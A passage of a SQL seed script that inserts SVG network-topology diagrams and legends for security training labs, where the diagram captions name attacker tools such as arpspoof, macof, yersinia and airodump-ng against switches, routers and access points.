font-weight="700">KALI · TFTP server</text><text x="375" y="56" text-anchor="middle" font-size="8" fill="#6b7480">atftpd · no auth</text><line x1="210" y1="37" x2="280" y2="37" stroke="#6b7480" stroke-width="2"/></svg>', '["Network device", "TFTP server/attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (35, '<svg viewBox="0 0 380 100" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">R1 (QoS)</text><rect x="140" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="190" y="32" text-anchor="middle" font-size="10">R2</text><line x1="110" y1="27" x2="140" y2="27" stroke="#6b7480" stroke-width="2"/><rect x="10" y="70" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="60" y="92" text-anchor="middle" font-size="9" font-weight="600">PC1 (voice)</text><rect x="140" y="70" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="190" y="92" text-anchor="middle" font-size="9" fill="#e5484d">KALI</text><line x1="60" y1="70" x2="60" y2="44" stroke="#2563eb" stroke-width="2"/><line x1="190" y1="70" x2="120" y2="44" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 500 160" font-family="monospace"><rect x="30" y="14" width="180" height="50" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="120" y="40" text-anchor="middle" font-size="13" font-weight="700">R1 · QoS policer</text><text x="120" y="56" text-anchor="middle" font-size="8" fill="#6b7480">priority queue 512k</text><rect x="290" y="14" width="180" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="380" y="40" text-anchor="middle" font-size="13" font-weight="700">R2</text><line x1="210" y1="39" x2="290" y2="39" stroke="#6b7480" stroke-width="2"/><rect x="30" y="110" width="180" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="120" y="135" text-anchor="middle" font-size="11" fill="#e5484d" font-weight="600">KALI · DSCP spoof</text><line x1="120" y1="110" x2="120" y2="64" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["QoS router", "Router", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (32, '<svg viewBox="0 0 380 120" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">SW1 (SNMP)</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#e5484d" font-weight="600">KALI (NMS)</text><line x1="110" y1="27" x2="270" y2="27" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 500 150" font-family="monospace"><rect x="30" y="20" width="200" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="130" y="46" text-anchor="middle" font-size="13" font-weight="700">SW1 · SNMP Agent</text><text x="130" y="62" text-anchor="middle" font-size="8" fill="#6b7480">public/private → v3 only</text><rect x="280" y="20" width="200" height="50" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="380" y="46" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="700">KALI · SNMP Tools</text><text x="380" y="62" text-anchor="middle" font-size="8" fill="#6b7480">snmpwalk · snmpset · onesixtyone</text><line x1="230" y1="45" x2="280" y2="45" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["SNMP agent", "SNMP manager (attacker)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (36, '<svg viewBox="0 0 380 80" font-family="monospace"><rect x="10" y="10" width="120" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="70" y="32" text-anchor="middle" font-size="10" font-weight="600">SW1 (port-sec)</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#e5484d">KALI</text><line x1="130" y1="27" x2="270" y2="27" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 450 120" font-family="monospace"><rect x="30" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="110" y="40" text-anchor="middle" font-size="13" font-weight="600">SW1 · port-security</text><text x="110" y="56" text-anchor="middle" font-size="8" fill="#6b7480">max 1 · sticky · shutdown</text><rect x="260" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="340" y="40" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="600">KALI · macof</text><text x="340" y="56" text-anchor="middle" font-size="8" fill="#6b7480">MAC flood + spoof</text><line x1="190" y1="37" x2="260" y2="37" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["Switch", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (37, '<svg viewBox="0 0 380 80" font-family="monospace"><rect x="10" y="10" width="120" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="70" y="32" text-anchor="middle" font-size="10" font-weight="600">SW1 (DHCP snoop)</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#e5484d">KALI</text><line x1="130" y1="27" x2="270" y2="27" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 450 120" font-family="monospace"><rect x="30" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="110" y="40" text-anchor="middle" font-size="13" font-weight="600">SW1 · DHCP snooping</text><text x="110" y="56" text-anchor="middle" font-size="8" fill="#6b7480">trusted uplink · rate 5</text><rect x="260" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="340" y="40" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="600">KALI · yersinia DHCP</text><text x="340" y="56" text-anchor="middle" font-size="8" fill="#6b7480">starvation + rogue DHCP</text><line x1="190" y1="37" x2="260" y2="37" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["Switch", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (38, '<svg viewBox="0 0 380 80" font-family="monospace"><rect x="10" y="10" width="120" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="70" y="32" text-anchor="middle" font-size="10" font-weight="600">SW1 (DAI)</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#e5484d">KALI</text><line x1="130" y1="27" x2="270" y2="27" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 450 120" font-family="monospace"><rect x="30" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="110" y="40" text-anchor="middle" font-size="13" font-weight="600">SW1 · DAI</text><text x="110" y="56" text-anchor="middle" font-size="8" fill="#6b7480">ARP inspection vlan 1</text><rect x="260" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="340" y="40" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="600">KALI · arpspoof</text><text x="340" y="56" text-anchor="middle" font-size="8" fill="#6b7480">forged ARP</text><line x1="190" y1="37" x2="260" y2="37" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["Switch", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (39, '<svg viewBox="0 0 300 60" font-family="monospace"><rect x="10" y="10" width="80" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="50" y="33" font-size="9" font-weight="600">R1 (WAN)</text><line x1="90" y1="27" x2="210" y2="27" stroke="#6b7480" stroke-width="2"/><text x="150" y="24" font-size="7" fill="#6b7480">HDLC/PPP</text><rect x="210" y="10" width="80" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="250" y="33" font-size="9" font-weight="600">R2 (WAN)</text></svg>', '<svg viewBox="0 0 500 100" font-family="monospace"><rect x="30" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="110" y="40" text-anchor="middle" font-size="13" font-weight="700">R1 · London WAN</text><text x="110" y="56" text-anchor="middle" font-size="8" fill="#6b7480">serial HDLC/PPP</text><line x1="190" y1="37" x2="310" y2="37" stroke="#6b7480" stroke-width="2"/><text x="250" y="34" font-size="9" fill="#6b7480">T1 WAN</text><rect x="310" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="390" y="40" text-anchor="middle" font-size="13" font-weight="700">R2 · Paris WAN</text><text x="390" y="56" text-anchor="middle" font-size="8" fill="#6b7480">serial HDLC/PPP</text></svg>', '["WAN router", "WAN link", "WAN router"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (40, '<svg viewBox="0 0 380 80" font-family="monospace"><rect x="10" y="10" width="120" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="70" y="32" text-anchor="middle" font-size="10" font-weight="600">Hypervisor</text><rect x="160" y="10" width="80" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="200" y="32" text-anchor="middle" font-size="9">VM1</text><rect x="250" y="10" width="80" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="290" y="32" text-anchor="middle" font-size="9" fill="#e5484d">KALI (VM2)</text></svg>', '<svg viewBox="0 0 500 100" font-family="monospace"><rect x="30" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="110" y="40" text-anchor="middle" font-size="13" font-weight="600">Hypervisor</text><text x="110" y="56" text-anchor="middle" font-size="8" fill="#6b7480">virtual switch</text><rect x="240" y="14" width="80" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="280" y="40" text-anchor="middle" font-size="11" fill="#2563eb">VM1</text><rect x="350" y="14" width="120" height="46" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="410" y="40" text-anchor="middle" font-size="11" fill="#e5484d">KALI (VM2)</text></svg>', '["Hypervisor", "Tenant VM", "Attacker VM"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (41, '<svg viewBox="0 0 380 80" font-family="monospace"><rect x="10" y="10" width="120" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="70" y="32" text-anchor="middle" font-size="10" font-weight="600">AP</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#e5484d">KALI</text><line x1="130" y1="27" x2="270" y2="27" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 500 120" font-family="monospace"><rect x="30" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="110" y="40" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="700">AP · WPA2</text><text x="110" y="56" text-anchor="middle" font-size="8" fill="#6b7480">SSID: NetBreaker-WiFi</text><rect x="280" y="14" width="190" height="46" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="375" y="40" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="700">KALI · airodump-ng</text><text x="375" y="56" text-anchor="middle" font-size="8" fill="#6b7480">deauth · handshake capture</text><line x1="190" y1="37" x2="280" y2="37" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["Access point", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (42, '<svg viewBox="0 0 380 80" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">WLC</text><rect x="140" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="190" y="32" text-anchor="middle" font-size="10">AP</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#e5484d">KALI</text><line x1="110" y1="27" x2="140" y2="27" stroke="#6b7480" stroke-width="2"/><line x1="240" y1="27" x2="270" y2="27" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 500 120" font-family="monospace"><rect x="30" y="14" width="140" height="46" rx="8" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="100" y="40" text-anchor="middle" font-size="13" font-weight="700">WLC</text><text x="100" y="56" text-anchor="middle" font-size="8" fill="#6b7480">CAPWAP controller</text><rect x="200" y="14" width="120" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="260" y="40" text-anchor="middle" font-size="13" fill="#2563eb">AP</text><rect x="350" y="14" width="140" height="46" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="420" y="40" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="700">KALI</text><line x1="170" y1="37" x2="200" y2="37" stroke="#6b7480" stroke-width="2"/><line x1="320" y1="37" x2="350" y2="37" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["WLC", "Access point", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (43, '<svg viewBox="0 0 380 80" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">R1</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#2563eb">KALI</text><line x1="110" y1="27" x2="270" y2="27" stroke="#2563eb" stroke-width="2"/></svg>', '<svg viewBox="0 0 500 120" font-family="monospace"><rect x="30" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="110" y="40" text-anchor="middle" font-size="13" font-weight="700">R1 · RESTCONF</text><text x="110" y="56" text-anchor="middle" font-size="8" fill="#6b7480">HTTPS · YANG data model</text><rect x="260" y="14" width="200" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="360" y="40" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="700">KALI · curl + Postman</text><text x="360" y="56" text-anchor="middle" font-size="8" fill="#6b7480">RESTCONF API calls</text><line x1="190" y1="37" x2="260" y2="37" stroke="#2563eb" stroke-width="2"/></svg>', '["RESTCONF device", "API client"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (44, '<svg viewBox="0 0 380 80" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">R1</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#2563eb">KALI</text><line x1="110" y1="27" x2="270" y2="27" stroke="#2563eb" stroke-width="2"/></svg>', '<svg viewBox="0 0 500 120" font-family="monospace"><rect x="30" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="110" y="40" text-anchor="middle" font-size="13" font-weight="700">R1 · NETCONF</text><text x="110" y="56" text-anchor="middle" font-size="8" fill="#6b7480">SSH port 830 · YANG</text><rect x="260" y="14" width="200" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="360" y="40" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="700">KALI · SSH + XML</text><text x="360" y="56" text-anchor="middle" font-size="8" fill="#6b7480">NETCONF get-config/edit-config</text><line x1="190" y1="37" x2="260" y2="37" stroke="#2563eb" stroke-width="2"/></svg>', '["NETCONF device", "NETCONF client"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (45, '<svg viewBox="0 0 380 80" font-family="monospace"><rect x="10" y="10" width="120" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="70" y="32" text-anchor="middle" font-size="10" font-weight="600">Ansible</text><rect x="160" y="10" width="80" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="200" y="32" text-anchor="middle" font-size="10">R1</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#e5484d">KALI</text><line x1="130" y1="27" x2="160" y2="27" stroke="#2563eb" stroke-width="2"/><line x1="240" y1="27" x2="270" y2="27" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 600 120" font-family="monospace"><rect x="30" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="110" y="40" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="700">Ansible control</text><text x="110" y="56" text-anchor="middle" font-size="8" fill="#6b7480">playbook + inventory</text><rect x="220" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="300" y="40" text-anchor="middle" font-size="13" font-weight="700">R1 · managed</text><text x="300" y="56" text-anchor="middle" font-size="8" fill="#6b7480">IOS config pushed</text><rect x="410" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="490" y="40" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="700">KALI · rogue</text><text x="490" y="56" text-anchor="middle" font-size="8" fill="#6b7480">malicious playbook</text><line x1="190" y1="37" x2="220" y2="37" stroke="#2563eb" stroke-width="2"/><line x1="380" y1="37" x2="410" y2="37" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["Ansible control node", "Managed device", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (15, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 220" font-family="ui-monospace,monospace">
  <rect x="140" y="10" width="100" height="30" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="190" y="30" text-anchor="middle" font-size="11" fill="#14161a" font-weight="600">SW1</text>
  <rect x="10" y="70" width="100" height="26" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="60" y="86" text-anchor="middle" font-size="9" fill="#14161a">H1 (hub)</text>
  <rect x="140" y="70" width="100" height="26" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="190" y="86" text-anchor="middle" font-size="9" fill="#14161a">R1</text>
  <rect x="270" y="70" width="100" height="26" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="320" y="86" text-anchor="middle" font-size="9" fill="#14161a">FW1</text>
  <line x1="110" y1="40" x2="140" y2="70" stroke="#6b7480" stroke-width="1.5"/>
  <line x1="190" y1="40" x2="190" y2="70" stroke="#6b7480" stroke-width="1.5"/>
  <line x1="240" y1="40" x2="270" y2="70" stroke="#6b7480" stroke-width="1.5"/>
  <circle cx="35" cy="144" r="18" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="35" y="148" text-anchor="middle" font-size="7" fill="#2563eb">PC1</text>
  <circle cx="85" cy="144" r="18" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="85" y="148" text-anchor="middle" font-size="7" fill="#2563eb">PC2</text>
  <rect x="10" y="176" width="100" height="26" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="60" y="193" text-anchor="middle" font-size="9" fill="#2563eb">PC3</text>
  <rect x="140" y="176" width="100" height="26" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="190" y="193" text-anchor="middle" font-size="9" fill="#e5484d">KALI</text>
  <line x1="35" y1="126" x2="50" y2="96" stroke="#2563eb" stroke-width="1.5"/>
  <line x1="85" y1="126" x2="70" y2="96" stroke="#2563eb" stroke-width="1.5"/>
  <line x1="60" y1="176" x2="60" y2="96" stroke="#6b7480" stroke-width="1.5"/>
  <line x1="60" y1="96" x2="130" y2="50" stroke="#6b7480" stroke-width="1.5"/>
  <line x1="190" y1="176" x2="190" y2="96" stroke="#e5484d" stroke-width="1.5"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 300" font-family="ui-monospace,monospace">
  <rect x="220" y="10" width="160" height="44" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="300" y="34" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">SW1</text>
  <text x="300" y="48" text-anchor="middle" font-size="8" fill="#6b7480">L2 switch · 5 ports</text>
  <rect x="30" y="100" width="120" height="36" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="90" y="122" text-anchor="middle" font-size="10" fill="#14161a">H1 (hub)</text>
  <rect x="220" y="100" width="160" height="36" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="300" y="122" text-anchor="middle" font-size="10" fill="#14161a">R1 (router)</text>
  <rect x="430" y="100" width="140" height="36" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="500" y="122" text-anchor="middle" font-size="10" fill="#14161a">FW1 (firewall)</text>
  <line x1="150" y1="54" x2="220" y2="100" stroke="#6b7480" stroke-width="1.5"/>
  <line x1="300" y1="54" x2="300" y2="100" stroke="#6b7480" stroke-width="1.5"/>
  <line x1="380" y1="54" x2="430" y2="100" stroke="#6b7480" stroke-width="1.5"/>
  <circle cx="48" cy="194" r="22" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="48" y="198" text-anchor="middle" font-size="8" fill="#2563eb">PC1</text>
  <circle cx="108" cy="194" r="22" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="108" y="198" text-anchor="middle" font-size="8" fill="#2563eb">PC2</text>
  <rect x="30" y="244" width="120" height="36" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="90" y="266" text-anchor="middle" font-size="10" fill="#2563eb">PC3</text>
  <rect x="220" y="244" width="160" height="36" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="300" y="266" text-anchor="middle" font-size="10" fill="#e5484d">KALI (sniffer)</text>
  <line x1="48" y1="172" x2="74" y2="136" stroke="#2563eb" stroke-width="1.5"/>
  <line x1="108" y1="172" x2="106" y2="136" stroke="#2563eb" stroke-width="1.5"/>
  <line x1="90" y1="244" x2="90" y2="136" stroke="#6b7480" stroke-width="1.5"/>
  <line x1="90" y1="136" x2="190" y2="60" stroke="#6b7480" stroke-width="1.5"/>
  <line x1="300" y1="244" x2="300" y2="136" stroke="#e5484d" stroke-width="1.5"/>
</svg>', '["Layer-2 switch", "Hub (shared collision domain)", "Router / firewall", "End host", "Attacker / observer"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (17, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 200" font-family="ui-monospace,monospace">
  <rect x="10" y="10" width="100" height="36" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="60" y="33" text-anchor="middle" font-size="11" fill="#2563eb" font-weight="600">PC1</text>
  <rect x="140" y="10" width="100" height="36" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="190" y="33" text-anchor="middle" font-size="11" fill="#14161a" font-weight="600">SW1</text>
  <rect x="270" y="10" width="100" height="36" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="320" y="33" text-anchor="middle" font-size="11" fill="#14161a" font-weight="600">R1</text>
  <line x1="110" y1="28" x2="140" y2="28" stroke="#2563eb" stroke-width="2"/>
  <line x1="240" y1="28" x2="270" y2="28" stroke="#6b7480" stroke-width="2"/>
  <rect x="270" y="100" width="100" height="36" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="320" y="123" text-anchor="middle" font-size="11" fill="#2563eb" font-weight="600">PC2</text>
  <rect x="10" y="100" width="100" height="36" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="60" y="123" text-anchor="middle" font-size="11" fill="#e5484d" font-weight="600">KALI</text>
  <line x1="320" y1="46" x2="320" y2="100" stroke="#2563eb" stroke-width="2"/>
  <line x1="60" y1="100" x2="170" y2="46" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
  <text x="185" y="175" text-anchor="middle" font-size="8" fill="#6b7480">10.0.0.0/24</text>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 340" font-family="ui-monospace,monospace">
  <rect x="40" y="20" width="160" height="44" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="120" y="42" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="600">PC1 (client)</text>
  <text x="120" y="58" text-anchor="middle" font-size="8" fill="#6b7480">App → L7 → L4 → L3 → L2 → wire</text>
  <rect x="250" y="20" width="200" height="44" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="350" y="42" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">SW1 (L2 switch)</text>
  <text x="350" y="58" text-anchor="middle" font-size="8" fill="#6b7480">DHCP snoop · DAI · port-security</text>
  <rect x="500" y="20" width="160" height="44" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="580" y="42" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1 (gateway)</text>
  <text x="580" y="58" text-anchor="middle" font-size="8" fill="#6b7480">uRPF · TCP intercept · ACL</text>
  <line x1="200" y1="42" x2="250" y2="42" stroke="#2563eb" stroke-width="2"/>
  <line x1="450" y1="42" x2="500" y2="42" stroke="#6b7480" stroke-width="2"/>
  <rect x="500" y="140" width="160" height="44" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="580" y="162" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="600">PC2 (server)</text>
  <text x="580" y="178" text-anchor="middle" font-size="8" fill="#6b7480">HTTP · responds to PC1</text>
  <rect x="40" y="220" width="200" height="54" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="140" y="244" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="600">KALI</text>
  <text x="140" y="262" text-anchor="middle" font-size="9" fill="#6b7480">L2: ARP spoof · L3: fragment · L4: SYN flood</text>
  <line x1="580" y1="64" x2="580" y2="140" stroke="#2563eb" stroke-width="2"/>
  <line x1="140" y1="220" x2="320" y2="64" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
</svg>', '["Client (packet origin)", "Layer-2 switch", "Router (multi-layer defense)", "Server / responder", "Attacker (layer-by-layer)"]'::jsonb)
